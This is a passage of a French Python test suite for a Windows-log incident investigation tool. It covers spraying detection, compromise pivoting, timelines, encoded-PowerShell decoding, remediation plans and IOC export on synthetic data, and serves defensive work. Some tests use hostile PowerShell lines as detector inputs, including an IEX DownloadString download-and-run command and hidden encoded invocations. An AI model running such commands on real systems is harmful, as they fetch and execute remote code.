import json
import os
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

from investigation import (ErreurChargement, Evenement, charger_logs, est_interne,
                           decoder_commande, etape1_detection, etape2_pivot,
                           etape3_chronologie, expliquer_etape1, expliquer_etape2,
                           expliquer_etape3, expliquer_etape4, etape4_plan,
                           evaluer_gravite, formater_heure, PRIORITES, ProfilIP,
                           ResultatDetection, ResultatPivot)
from tests.jeu_synthetique import (B64_GET_PROCESS, IP_BRUTE, IP_FP, IP_SPRAY_A, IP_SPRAY_B,
                                   chemin_jeu_synthetique, construire_jeu, ecrire_jeu)


def ecrire_tmp(objets):
    """Écrit objets en JSON dans un fichier temporaire supprimé en fin de test."""
    with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(objets, f)
    return f.name


class TestChargement(unittest.TestCase):
    def _tmp(self, objets):
        chemin = ecrire_tmp(objets)
        self.addCleanup(os.remove, chemin)
        return chemin

    def test_tri_et_formats_horodatage(self):
        chemin = self._tmp([
            {"timestamp": "2026-05-20T10:00:12.5Z", "event_id": 4624},
            {"timestamp": "2026-05-20T09:00:00+00:00", "event_id": 4625},
            {"timestamp": "2026-05-20T08:00:00Z", "event_id": 4688},
        ])
        evts = charger_logs(chemin)
        self.assertEqual([e.timestamp for e in evts],
                         sorted(e.timestamp for e in evts))
        self.assertEqual([e.event_id for e in evts], [4688, 4625, 4624])
        self.assertEqual(evts[0].timestamp.tzinfo, timezone.utc)

    def test_champs_manquants(self):
        chemin = self._tmp(
            [{"timestamp": "2026-05-20T08:00:00Z", "event_id": 4625, "details": None}])
        e = charger_logs(chemin)[0]
        self.assertEqual((e.host, e.account, e.src_ip, e.details), ("", "", None, {}))
        self.assertEqual((e.logon_type, e.result), (None, ""))

    def test_timestamp_invalide_ignore(self):
        chemin = self._tmp([{"event_id": 4625},
                            {"timestamp": "n'importe quoi", "event_id": 4625},
                            {"timestamp": "2026-05-20T08:00:00Z", "event_id": 4624}])
        self.assertEqual(len(charger_logs(chemin)), 1)

    def test_fichier_absent(self):
        with self.assertRaises(ErreurChargement):
            charger_logs("inexistant.json")

    def test_json_invalide(self):
        with tempfile.NamedTemporaryFile(
                "w", suffix=".json", delete=False, encoding="utf-8") as f:
            f.write("ceci n'est pas du JSON")
        self.addCleanup(os.remove, f.name)
        with self.assertRaises(ErreurChargement):
            charger_logs(f.name)

    def test_racine_non_liste(self):
        with self.assertRaises(ErreurChargement):
            charger_logs(self._tmp({"timestamp": "2026-05-20T08:00:00Z"}))

    def test_jeu_synthetique_charge(self):
        chemin = chemin_jeu_synthetique()
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        self.assertEqual(len(evts), 2 + 12 + 12 + 7 + 15 + 11)
        self.assertEqual([e.timestamp for e in evts],
                         sorted(e.timestamp for e in evts))


class TestEtape1(unittest.TestCase):
    def _evts(self):
        chemin = chemin_jeu_synthetique()
        self.addCleanup(os.remove, chemin)
        return charger_logs(chemin)

    def setUp(self):
        self.det = etape1_detection(self._evts())

    def test_suspectes_et_categories(self):
        self.assertEqual(
            [(p.ip, p.categorie, p.nb_echecs, len(p.comptes)) for p in self.det.suspectes],
            [(IP_SPRAY_A, "spraying", 12, 6), (IP_SPRAY_B, "spraying", 15, 8),
             (IP_BRUTE, "force_brute", 11, 1)])

    def test_faux_positif_ecarte(self):
        self.assertEqual([(p.ip, p.categorie) for p in self.det.ecartees],
                         [(IP_FP, "faux_positif_probable")])

    def test_fenetre(self):
        a = self.det.suspectes[0]
        self.assertEqual((a.debut.strftime("%H:%M:%S"), a.fin.strftime("%H:%M:%S")),
                         ("09:00:00", "09:07:20"))
        self.assertEqual(a.hosts, ["SRV-FILE02"])

    def test_totaux(self):
        self.assertEqual(self.det.nb_echecs_total, 12 + 12 + 15 + 11)
        self.assertEqual(self.det.nb_ip_analysees, 4)

    def test_incoherence_result_comptee(self):
        self.assertEqual(self.det.nb_incoherences_result, 12 + 12 + 15 + 11)

    def test_est_interne(self):
        self.assertTrue(est_interne("10.8.0.50"))
        self.assertFalse(est_interne("203.0.113.200"))
        self.assertFalse(est_interne("pas-une-ip"))

    def test_seuils_parametrables(self):
        det = etape1_detection(self._evts(), seuil_echecs=13)
        self.assertEqual(det.suspectes[0].ip, IP_SPRAY_B)

    def test_formater_heure(self):
        dt = self.det.suspectes[0].debut
        self.assertEqual(formater_heure(dt, False), "09:00")
        self.assertEqual(formater_heure(dt, True), "20/05 09:00")

    def test_explication(self):
        t = expliquer_etape1(self.det, multi_jours=False)
        for attendu in ("=== ÉTAPE 1", "Recherche :", "Résultat :", "->", IP_SPRAY_A,
                        "12 échecs", "6 comptes", "09:00", "password spraying",
                        "force brute", IP_FP, "svc_web", "compte de service"):
            self.assertIn(attendu, t)

    def test_seuils_dans_explication(self):
        det = etape1_detection(self._evts(), seuil_echecs=13, seuil_comptes=7)
        t = expliquer_etape1(det, multi_jours=False)
        self.assertIn("à partir de 13 échecs", t)
        self.assertIn("au moins 7 comptes", t)
        self.assertNotIn("à partir de 10 échecs", t)

    def test_singulier_force_brute(self):
        t = expliquer_etape1(self.det, multi_jours=False)
        ligne = [l for l in t.splitlines() if IP_BRUTE in l][0]
        self.assertIn("1 compte,", ligne)
        self.assertNotIn("1 comptes", t)
        self.assertIn("machine visée : SRV-VPN01", ligne)

    def test_multi_jours_dans_explication(self):
        t = expliquer_etape1(self.det, multi_jours=True)
        self.assertIn("20/05 09:00", t)

    @staticmethod
    def _echecs(ip, comptes, n, event_id=4625):
        base = datetime(2026, 5, 20, 8, 0, tzinfo=timezone.utc)
        return [Evenement(base + timedelta(seconds=i), event_id, "H1",
                          comptes[i % len(comptes)], ip, 3, "", {})
                for i in range(n)]

    def test_interne_plusieurs_comptes_sous_seuil_ecartee(self):
        det = etape1_detection(self._echecs("10.1.1.1", ["a", "b", "c"], 12))
        self.assertEqual(det.suspectes, [])
        self.assertEqual([(p.ip, p.categorie) for p in det.ecartees],
                         [("10.1.1.1", "sous_seuil")])

    def test_sous_seuil_echecs_non_ecartee(self):
        det = etape1_detection(self._echecs("198.51.100.9", ["a", "b"], 9))
        self.assertEqual((det.suspectes, det.ecartees), ([], []))
        self.assertEqual(det.nb_ip_analysees, 1)

    def test_src_ip_absente_ignoree(self):
        evts = self._echecs(None, ["a"], 20) + self._echecs("", ["a"], 20)
        det = etape1_detection(evts)
        self.assertEqual((det.nb_echecs_total, det.nb_ip_analysees), (0, 0))
        self.assertEqual((det.suspectes, det.ecartees), ([], []))

    def test_4624_non_compte(self):
        evts = self._echecs("198.51.100.9", ["a"], 20, event_id=4624)
        det = etape1_detection(evts)
        self.assertEqual((det.nb_echecs_total, det.suspectes), (0, []))

    def test_aucune_ip_suspecte(self):
        t = expliquer_etape1(etape1_detection([]), multi_jours=False)
        self.assertIn("Aucune IP", t)


class TestEtape2(unittest.TestCase):
    def _pivot(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        return etape2_pivot(evts, etape1_detection(evts))

    @staticmethod
    def _succes(ts, host, compte, ip, logon_type=3):
        return {"timestamp": ts, "event_id": 4624, "host": host, "account": compte,
                "src_ip": ip, "logon_type": logon_type, "result": "success",
                "details": {}}

    def test_compromission_synthetique(self):
        piv = self._pivot()
        self.assertEqual(
            [(x.ip, x.compte, x.host, x.t0.strftime("%H:%M"), x.logon_type)
             for x in piv.compromissions],
            [(IP_SPRAY_A, "u.trois", "SRV-FILE02", "09:12", 3)])
        self.assertEqual([p.ip for p in piv.non_abouties], [IP_SPRAY_B, IP_BRUTE])

    def test_succes_avant_premier_echec_ignore(self):
        # Connexion légitime à 09:59, avant le premier échec de l'IP (10:00)
        piv = self._pivot([self._succes("2026-05-20T09:59:00Z", "WKS-110", "v.a",
                                        IP_SPRAY_B)])
        self.assertEqual([x.ip for x in piv.compromissions], [IP_SPRAY_A])
        self.assertIn(IP_SPRAY_B, [p.ip for p in piv.non_abouties])

    def test_plusieurs_couples(self):
        piv = self._pivot([
            self._succes("2026-05-20T09:13:00Z", "SRV-FILE03", "u.un", IP_SPRAY_A),
            # même couple que l'original, plus tard : une seule compromission
            self._succes("2026-05-20T09:40:00Z", "SRV-FILE02", "u.trois", IP_SPRAY_A)])
        self.assertEqual(
            [(x.compte, x.host, x.t0.strftime("%H:%M")) for x in piv.compromissions],
            [("u.trois", "SRV-FILE02", "09:12"), ("u.un", "SRV-FILE03", "09:13")])
        self.assertEqual([p.ip for p in piv.non_abouties], [IP_SPRAY_B, IP_BRUTE])

    def test_explication(self):
        t = expliquer_etape2(self._pivot(), False)
        for attendu in ("=== ÉTAPE 2", "u.trois", "SRV-FILE02", "09:12", "a abouti",
                        "accès réseau", IP_SPRAY_B, "n'a pas abouti"):
            self.assertIn(attendu, t)

    def test_explication_sans_ip_suspecte(self):
        evts = []
        piv = etape2_pivot(evts, etape1_detection(evts))
        self.assertIn("rien à pivoter", expliquer_etape2(piv, False))


class TestEtape3(unittest.TestCase):
    def _chronos(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        piv = etape2_pivot(evts, etape1_detection(evts))
        return etape3_chronologie(evts, piv)

    @staticmethod
    def _proc(ts, host, compte, process, parent, cmd=None):
        return {"timestamp": ts, "event_id": 4688, "host": host, "account": compte,
                "src_ip": None, "logon_type": None, "result": "success",
                "details": {"process": process, "parent_process": parent,
                            "command_line": cmd or process}}

    def test_chronologie_synthetique(self):
        chronos = self._chronos()
        self.assertEqual(len(chronos), 1)
        ch = chronos[0]
        self.assertEqual([(q.evt.timestamp.strftime("%H:%M"), q.nature) for q in ch.evenements], [
            ("09:12", "connexion_initiale"), ("09:14", "processus_suspect"),
            ("09:16", "tache_planifiee"), ("09:18", "creation_compte"),
            ("09:19", "ajout_groupe_privilegie"), ("09:25", "mouvement_lateral"),
            ("09:27", "processus_suspect")])
        self.assertEqual(ch.comptes_suivis, ["u.trois", "adm_tmp"])
        self.assertEqual(ch.evenements[-1].commande_decodee, "Get-Process")

    def test_activite_hors_perimetre_exclue(self):
        # le 4688 chrome.exe de p.alpha sur WKS-101 (09:30) n'apparaît pas
        ch = self._chronos()[0]
        self.assertNotIn("WKS-101", [q.evt.host for q in ch.evenements])
        self.assertNotIn("p.alpha", [q.evt.account for q in ch.evenements])

    def test_processus_benin_sur_host(self):
        ch = self._chronos([self._proc("2026-05-20T09:20:00Z", "SRV-FILE02", "m.legit",
                                       "notepad.exe", "explorer.exe")])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:20"]
        self.assertEqual(len(q), 1)
        self.assertEqual(q[0].nature, "processus_benin")
        self.assertFalse(q[0].suspect)

    def test_processus_autre_compte_sur_host_et_chemin_complet(self):
        ch = self._chronos([self._proc(
            "2026-05-20T09:21:00Z", "SRV-FILE02", "autre",
            "C:\\Windows\\System32\\CMD.exe", "C:\\Program Files\\EXCEL.EXE")])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:21"]
        self.assertEqual(q[0].nature, "processus_suspect")

    def test_effacement_journal(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:40:00Z", "event_id": 1102,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": None,
                             "logon_type": None, "result": "success", "details": {}}])[0]
        self.assertEqual(ch.evenements[-1].nature, "effacement_journal")
        self.assertTrue(ch.evenements[-1].suspect)
        self.assertIn("journal de sécurité effacé", ch.evenements[-1].description)

    def test_decoder_commande(self):
        self.assertEqual(decoder_commande("powershell.exe -nop -w hidden -enc " + B64_GET_PROCESS),
                         "Get-Process")
        self.assertEqual(decoder_commande("powershell -EncodedCommand " + B64_GET_PROCESS),
                         "Get-Process")
        self.assertEqual(decoder_commande("powershell -enc %%%"), "non décodable")
        self.assertEqual(decoder_commande("powershell -enc"), "non décodable")
        self.assertIsNone(decoder_commande("chrome.exe"))

    def test_explication(self):
        t = expliquer_etape3(self._chronos(), False)
        for attendu in ("=== ÉTAPE 3", "SRV-FILE02", "09:12", "excel.exe", "\\OneDriveSyncHelper",
                        "adm_tmp", "Admins du domaine", "WKS-205", "Get-Process", "[!]",
                        "créé par l'attaquant"):
            self.assertIn(attendu, t)

    def _nature_proc(self, process, parent, cmd, compte="u.trois"):
        ch = self._chronos([self._proc("2026-05-20T09:22:00Z", "SRV-FILE02", compte,
                                       process, parent, cmd)])[0]
        return [q for q in ch.evenements
                if q.evt.timestamp.strftime("%H:%M") == "09:22"][0]

    def test_marqueurs_mots_entiers_faux_positifs(self):
        for process, cmd in (
                ("iexplore.exe", "C:\\Program Files\\Internet Explorer\\iexplore.exe"),
                ("notepad.exe", "notepad.exe C:\\hidden\\a.txt"),
                ("cmd.exe", "cmd.exe /c start -nopause")):
            # compte non suivi : seul l'éventuel marqueur rendrait l'événement suspect
            q = self._nature_proc(process, "explorer.exe", cmd, compte="m.legit")
            self.assertEqual(q.nature, "processus_benin", cmd)
            self.assertFalse(q.suspect)

    def test_marqueurs_cas_positifs(self):
        for cmd in ("powershell.exe -nop -w hidden -enc JABjAD0A",
                    "powershell -EncodedCommand " + B64_GET_PROCESS,
                    "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')",
                    "powershell -c iex(foo)",
                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x')"):
            q = self._nature_proc("powershell.exe", "explorer.exe", cmd)
            self.assertEqual(q.nature, "processus_suspect", cmd)

    def test_commande_non_decodable_dans_evenement(self):
        q = self._nature_proc("powershell.exe", "explorer.exe", "powershell -enc %%%")
        self.assertEqual(q.commande_decodee, "non décodable")

    def test_connexion_benigne_sur_host(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:30:00Z", "event_id": 4624,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": "10.8.0.5",
                             "logon_type": 2, "result": "success", "details": {}}])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:30"][0]
        self.assertEqual(q.nature, "connexion")
        self.assertFalse(q.suspect)

    def test_ajout_groupe_non_privilegie(self):
        ch = self._chronos([{"timestamp": "2026-05-20T09:31:00Z", "event_id": 4732,
                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": None,
                             "logon_type": None, "result": "success",
                             "details": {"group": "Comptabilité", "member": "u.trois"}}])[0]
        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:31"][0]
        self.assertEqual(q.nature, "ajout_groupe")
        self.assertFalse(q.suspect)

    def test_glose_explication(self):
        t = expliquer_etape3(self._chronos(), False)
        self.assertIn("contenu masqué", t)
        self.assertIn("téléchargement d'un fichier depuis Internet", t)

    def test_explication_vide(self):
        self.assertIn("aucune compromission", expliquer_etape3([], False))


class TestEtape4(unittest.TestCase):
    def _etapes(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        det = etape1_detection(evts)
        piv = etape2_pivot(evts, det)
        chronos = etape3_chronologie(evts, piv)
        return det, piv, chronos

    def setUp(self):
        self.det, self.piv, self.chronos = self._etapes()
        self.actions = etape4_plan(self.det, self.piv, self.chronos)

    def test_actions_attendues(self):
        textes = " | ".join(a.action for a in self.actions)
        for attendu in ("Bloquer l'IP " + IP_SPRAY_A, "Bloquer l'IP " + IP_SPRAY_B,
                        "Bloquer l'IP " + IP_BRUTE,
                        "Isoler SRV-FILE02", "Réinitialiser le mot de passe de u.trois",
                        "Désactiver le compte adm_tmp",
                        "Retirer adm_tmp du groupe Admins du domaine",
                        "Supprimer la tâche planifiée \\OneDriveSyncHelper",
                        "Isoler WKS-205", "svc_web",
                        "Surveiller les comptes visés par " + IP_SPRAY_B + " (8)",
                        "Revoir la robustesse des mots de passe des 6 comptes visés par " + IP_SPRAY_A,
                        "Get-Process"):
            self.assertIn(attendu, textes)

    def test_pas_d_action_sans_fait(self):
        self.assertNotIn("journal", " ".join(a.fait + a.action for a in self.actions).lower())

    def test_journal_efface(self):
        efface = {"timestamp": "2026-05-20T09:30:00Z", "event_id": 1102, "host": "SRV-FILE02",
                  "account": "u.trois", "src_ip": None, "logon_type": None,
                  "result": "success", "details": {}}
        det, piv, chronos = self._etapes([efface])
        actions = etape4_plan(det, piv, chronos)
        siem = [a for a in actions if "SIEM" in a.action]
        self.assertEqual(len(siem), 1)
        self.assertEqual(siem[0].priorite, "COURT TERME")
        self.assertIn("journal", siem[0].fait.lower())

    def test_chaque_action_a_un_fait(self):
        self.assertTrue(all(a.fait and a.priorite in PRIORITES for a in self.actions))

    def test_dedoublonnage_et_tri(self):
        textes = [a.action for a in self.actions]
        self.assertEqual(len(textes), len(set(textes)))
        rangs = [PRIORITES.index(a.priorite) for a in self.actions]
        self.assertEqual(rangs, sorted(rangs))

    def test_gravite(self):
        self.assertEqual(evaluer_gravite(self.piv, self.chronos), "CRITIQUE")
        self.assertEqual(evaluer_gravite(ResultatPivot([], []), []), "FAIBLE")
        self.assertEqual(evaluer_gravite(ResultatPivot([], self.det.suspectes), []), "MODÉRÉE")
        self.assertEqual(evaluer_gravite(self.piv, []), "ÉLEVÉE")

    def test_explication(self):
        t = expliquer_etape4(self.actions, "CRITIQUE", self.piv, self.chronos,
                             len(self.det.suspectes))
        self.assertIn("=== ÉTAPE 4", t)
        self.assertIn("3 IP suspectes", t)
        self.assertIn("1 compromission", t)
        self.assertIn("rebond vers WKS-205", t)
        self.assertIn("Admins du domaine", t)
        self.assertNotIn("journal de sécurité effacé", t)
        self.assertIn("->", t)
        self.assertIn("CRITIQUE", t)

    def _prio(self, debut, actions=None):
        trouvees = [a for a in (actions or self.actions) if a.action.startswith(debut)]
        self.assertEqual(len(trouvees), 1, debut)
        return trouvees[0].priorite

    def test_priorites_attendues(self):
        self.assertEqual(self._prio("Retirer adm_tmp du groupe Admins du domaine"), "IMMÉDIAT")
        self.assertEqual(self._prio("Isoler WKS-205"), "IMMÉDIAT")
        self.assertEqual(self._prio("Isoler SRV-FILE02"), "IMMÉDIAT")
        self.assertEqual(self._prio("Supprimer la tâche planifiée"), "COURT TERME")
        self.assertEqual(self._prio("Vérifier le mot de passe du compte de service svc_web"),
                         "SUIVI")

    def test_groupe_non_privilegie_court_terme(self):
        ajout = {"timestamp": "2026-05-20T09:20:00Z", "event_id": 4732, "host": "SRV-FILE02",
                 "account": "u.trois", "src_ip": None, "logon_type": None,
                 "result": "success", "details": {"group": "Comptabilité", "member": "u.trois"}}
        actions = etape4_plan(*self._etapes([ajout]))
        self.assertEqual(self._prio("Retirer u.trois du groupe Comptabilité", actions),
                         "COURT TERME")

    def test_commande_non_decodable_utilise_la_ligne_brute(self):
        brut = "powershell.exe -enc !!!pas_du_base64"
        proc = {"timestamp": "2026-05-20T09:21:00Z", "event_id": 4688, "host": "SRV-FILE02",
                "account": "u.trois", "src_ip": None, "logon_type": None, "result": "success",
                "details": {"process": "powershell.exe", "parent_process": "explorer.exe",
                            "command_line": brut}}
        actions = etape4_plan(*self._etapes([proc]))
        self.assertTrue(any(a.action.endswith("analyser la commande : " + brut)
                            for a in actions))
        self.assertFalse(any("non décodable" in a.action for a in actions))

    def test_pas_de_faux_positif_pour_sous_seuil(self):
        det = self.det
        sous = ProfilIP("10.9.9.9", 12, ["a", "b"], ["H"], det.suspectes[0].debut,
                        det.suspectes[0].fin, "sous_seuil", "x")
        det2 = ResultatDetection(det.suspectes, det.ecartees + [sous], 0, 0, 0)
        actions = etape4_plan(det2, self.piv, self.chronos)
        self.assertEqual(sum("compte de service" in a.action for a in actions), 1)
        self.assertFalse(any("10.9.9.9" in a.fait for a in actions))

    def test_comptes_une_action_par_ip(self):
        surveiller = [a for a in self.actions if a.action.startswith("Surveiller")]
        revoir = [a for a in self.actions if a.action.startswith("Revoir")]
        self.assertEqual(len(surveiller), len(self.piv.non_abouties))
        self.assertEqual(len(revoir), sum(p.categorie == "spraying" for p in self.det.suspectes))
        self.assertTrue(all(a.priorite == "SUIVI" for a in surveiller + revoir))

    def test_deux_ip_meme_nombre_de_comptes(self):
        evts = []
        for k, ip in enumerate(("198.51.100.1", "198.51.100.2")):
            for i in range(14):
                evts.append({"timestamp": f"2026-05-20T12:{k * 10:02d}:{i:02d}Z",
                             "event_id": 4625, "host": "H", "account": f"x.{i % 7}",
                             "src_ip": ip, "logon_type": 3, "result": "success",
                             "details": {}})
        chemin = ecrire_jeu(evts)
        self.addCleanup(os.remove, chemin)
        e = charger_logs(chemin)
        det = etape1_detection(e)
        piv = etape2_pivot(e, det)
        actions = etape4_plan(det, piv, etape3_chronologie(e, piv))
        for debut in ("Surveiller", "Revoir"):
            self.assertEqual(sum(a.action.startswith(debut) for a in actions), 2)

    def test_jargon_glose(self):
        textes = " ".join(a.action for a in self.actions)
        self.assertIn("MFA (double authentification)", textes)
        self.assertIn("(le déconnecter partout)", textes)


# --- Task 8 : étape 5, rapport texte et CLI ---------------------------------
import contextlib
import io
import shutil
from unittest import mock

from enrichissement_vt import ClientVT
from investigation import Investigation, expliquer_etape5, investiguer, main, rapport_texte
from iocs import IOC

RACINE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_FOURNIS = os.path.join(RACINE, "logs_test.json")


class _DossierTemporaire(unittest.TestCase):
    """Exécute chaque test dans un dossier temporaire (main écrit dans le dossier courant)."""
    def setUp(self):
        self.dossier = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dossier, True)
        self.ancien = os.getcwd()
        os.chdir(self.dossier)
        self.addCleanup(os.chdir, self.ancien)

    def jeu(self, evenements=None):
        chemin = ecrire_jeu(evenements)
        self.addCleanup(os.remove, chemin)
        return chemin

    def lancer(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = main(argv)
        return code, out.getvalue(), err.getvalue()


class TestBoutEnBout(_DossierTemporaire):
    def test_jeu_synthetique(self):
        t = rapport_texte(investiguer(self.jeu()))
        for n in range(1, 6):
            self.assertIn(f"=== ÉTAPE {n}", t)
        self.assertEqual(t.count("Recherche :"), 5)
        self.assertGreaterEqual(t.count("->"), 5)

    def test_jeu_fourni_non_regression(self):
        t = rapport_texte(investiguer(LOGS_FOURNIS))
        for attendu in ("203.0.113.47", "37 échecs", "14 comptes", "j.martin", "WKS-014",
                        "winword.exe", "\\MicrosoftUpdateSync", "svc_backup", "Administrateurs",
                        "journal", "10.2.5.9", "svc_sql"):
            self.assertIn(attendu, t)

    def test_en_tete(self):
        inv = investiguer(self.jeu())
        t = rapport_texte(inv)
        self.assertTrue(t.startswith("RAPPORT D'INVESTIGATION AUTOMATISÉE"))
        self.assertIn(inv.chemin, t)
        self.assertIn(f"{len(inv.evts)} événements", t)
        self.assertIn("UTC", t)
        self.assertIn(inv.gravite, t)
        self.assertEqual(inv.gravite, "CRITIQUE")
        self.assertFalse(inv.multi_jours)
        self.assertIn("\n\n=== ÉTAPE 1", t)

    def test_jeu_vide(self):
        chemin = self.jeu([])
        code, out, _ = self.lancer([chemin])
        self.assertEqual(code, 0)
        with open("sortie_rapport.txt", encoding="utf-8") as f:
            t = f.read()
        self.assertIn("Aucune IP", t)
        self.assertIn("aucune donnée", t)
        for n in range(1, 6):
            self.assertIn(f"=== ÉTAPE {n}", t)
        self.assertTrue(os.path.exists("iocs_misp.csv"))
        self.assertTrue(os.path.exists("iocs_stix.json"))

    def test_sans_4625(self):
        legitimes = [e for e in construire_jeu() if e["account"] == "p.alpha"]
        self.assertEqual(len(legitimes), 2)
        code, out, _ = self.lancer([self.jeu(legitimes)])
        self.assertEqual(code, 0)
        self.assertIn("Aucune IP", out)
        for n in range(1, 6):
            self.assertIn(f"=== ÉTAPE {n}", out)
        self.assertIn("FAIBLE", out)

    def test_fichier_absent(self):
        code, out, err = self.lancer([os.path.join(self.dossier, "inexistant.json")])
        self.assertEqual(code, 1)
        self.assertIn("introuvable", err)
        self.assertFalse(os.path.exists("sortie_rapport.txt"))

    def test_json_invalide(self):
        chemin = os.path.join(self.dossier, "casse.json")
        with open(chemin, "w", encoding="utf-8") as f:
            f.write("{pas du json")
        code, _, err = self.lancer([chemin])
        self.assertEqual(code, 1)
        self.assertIn("JSON invalide", err)

    def test_main_sorties(self):
        code, out, err = self.lancer([self.jeu()])
        self.assertEqual(code, 0)
        with open("sortie_rapport.txt", encoding="utf-8") as f:
            t = f.read()
        self.assertIn(t.strip(), out)
        self.assertNotIn("Fichiers produits", t)
        self.assertIn("Fichiers produits : sortie_rapport.txt, iocs_misp.csv, iocs_stix.json", out)
        with open("iocs_misp.csv", encoding="utf-8") as f:
            self.assertIn(IP_SPRAY_A, f.read())
        with open("iocs_stix.json", encoding="utf-8") as f:
            bundle = json.load(f)
        valides = {o["valid_from"] for o in bundle["objects"] if o["type"] == "indicator"}
        # première IP suspecte (spray A, 09:00) ; le faux positif de 08:00 n'est pas suspect
        self.assertEqual(valides, {"2026-05-20T09:00:00.000Z"})

    def test_multi_jours(self):
        evts = construire_jeu()
        evts.append({"timestamp": "2026-05-21T06:00:00Z", "event_id": 4624, "host": "WKS-101",
                     "account": "p.alpha", "src_ip": "10.8.0.11", "logon_type": 2,
                     "result": "success", "details": {}})
        inv = investiguer(self.jeu(evts))
        self.assertTrue(inv.multi_jours)
        self.assertIn("20/05 09:12", rapport_texte(inv))

    def test_enrichissement_injecte(self):
        inv = investiguer(self.jeu(), enrichir=True,
                          client_vt=ClientVT(None))
        c = inv.comptage_vt
        self.assertEqual(sum(c.values()), len(inv.iocs))
        self.assertEqual(c["non_soumis"], 3)   # trois IP de documentation RFC 5737
        self.assertGreater(c["cle_absente"], 0)
        self.assertGreater(c["non_applicable"], 0)
        t = rapport_texte(inv)
        self.assertIn("RFC 5737", t)
        self.assertIn("Aucun fichier ni échantillon n'a été envoyé", t)
        self.assertIn("clé VT_API_KEY absente", t)

    def test_enrichissement_sans_client_lit_l_environnement(self):
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("VT_API_KEY", None)
            inv = investiguer(self.jeu(), enrichir=True)
        self.assertIn("cle_absente", inv.comptage_vt)

    def test_sans_enrichissement(self):
        inv = investiguer(self.jeu())
        self.assertIsNone(inv.comptage_vt)
        self.assertTrue(all(i.statut_enrichissement is None for i in inv.iocs))
        self.assertIn("enrichissement non demandé (option --enrichir)", rapport_texte(inv))

    def test_aucune_valeur_en_dur(self):
        sources = ""
        for f in ("investigation.py", "iocs.py", "enrichissement_vt.py", "rapport_word.py", "affichage.py"):
            if os.path.exists(os.path.join(RACINE, f)):
                with open(os.path.join(RACINE, f), encoding="utf-8") as fic:
                    sources += fic.read()
        for v in ("203.0.113.47", "10.2.5.9", "j.martin", "WKS-014", "svc_backup",
                  "MicrosoftUpdateSync", "svc_sql", "2026-03-12"):
            self.assertNotIn(v, sources)


class TestEtape5(unittest.TestCase):
    def iocs(self):
        return [IOC("198.51.100.23", "ip-src", "Network activity", True, "IP"),
                IOC("evil.example.net", "domain", "Network activity", True, "dom"),
                IOC("adm_tmp", "text", "Persistence mechanism", False, "compte",
                    role="compte_cree")]

    def test_non_enrichi(self):
        t = expliquer_etape5(self.iocs(), None)
        self.assertTrue(t.startswith("=== ÉTAPE 5 : IOC ET ENRICHISSEMENT ==="))
        for motif in ("Recherche :", "Résultat :", "->", "3 IOC", "IP d'attaque", "domaine",
                      "compte créé",
                      "enrichissement non demandé (option --enrichir)",
                      "iocs_misp.csv", "iocs_stix.json"):
            self.assertIn(motif, t)
        self.assertNotIn("Aucun fichier ni échantillon", t)

    def test_enrichi_avec_verdict(self):
        iocs = self.iocs()
        iocs[0].statut_enrichissement = "non_soumis"
        iocs[0].enrichissement = {"message": "plage de documentation RFC 5737, non soumise"}
        iocs[1].statut_enrichissement = "ok"
        iocs[1].enrichissement = {"malicious": 3, "suspicious": 1, "harmless": 50,
                                  "undetected": 10, "reputation": -5}
        iocs[2].statut_enrichissement = "non_applicable"
        iocs[2].enrichissement = {"message": "type non pris en charge par VirusTotal"}
        t = expliquer_etape5(iocs, {"non_soumis": 1, "ok": 1, "non_applicable": 1})
        self.assertIn("3 moteurs sur 64 le jugent malveillant", t)
        self.assertIn("RFC 5737", t)
        self.assertIn("evil.example.net", t)
        self.assertIn("Aucun fichier ni échantillon n'a été envoyé : seules des valeurs "
                      "(IP, domaines, URL, empreintes) sont consultées.", t)

    def test_aucun_ioc(self):
        t = expliquer_etape5([], None)
        self.assertIn("aucun IOC", t)
        self.assertIn("->", t)



# --- Corrections de la revue finale ------------------------------------------
from investigation import _marqueurs_presents, qualifier_evenement

B64_IEX = "SQBFAFgA"  # « IEX » en UTF-16LE


def _brut(ts, event_id, host, compte, src_ip=None, logon_type=None, **details):
    return {"timestamp": ts, "event_id": event_id, "host": host, "account": compte,
            "src_ip": src_ip, "logon_type": logon_type, "result": "success",
            "details": details}


class TestRevueFinale(unittest.TestCase):
    _chronos = TestEtape3._chronos
    _proc = staticmethod(TestEtape3._proc)

    def _etapes(self, supplementaires=()):
        chemin = ecrire_jeu(construire_jeu() + list(supplementaires))
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        det = etape1_detection(evts)
        piv = etape2_pivot(evts, det)
        return evts, det, piv, etape3_chronologie(evts, piv)

    @staticmethod
    def _a(ch, hhmm):
        return [q for q in ch.evenements if q.evt.timestamp.strftime("%H:%M") == hhmm]

    # Finding 2 : options encodées abrégées
    def test_options_encodees_abregees_decodees(self):
        for option in ("-e", "-ec", "-enc", "-enco", "/enc", "-EncodedCommand", "-EC"):
            ligne = f"powershell.exe -nop {option} {B64_GET_PROCESS}"
